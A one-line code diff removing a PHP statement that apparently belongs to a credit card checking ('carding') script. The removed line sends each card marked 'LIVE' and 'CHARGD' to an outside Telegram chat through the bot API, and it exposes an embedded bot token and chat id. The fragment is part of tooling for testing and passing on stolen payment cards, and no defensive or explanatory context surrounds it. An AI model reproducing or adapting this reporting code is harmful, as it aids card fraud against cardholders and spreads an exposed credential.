@@ -1,1 +1,0 @@
-file_get_contents('https://api.telegram.org/bot1958196570:AAF5TFelDuxrCqHzBY8Star8_SyrEVegW9s/sendMessage?chat_id=1981360723&text=LIVE ==> '.$lista.' ==> [ ccn CHARGD ]');
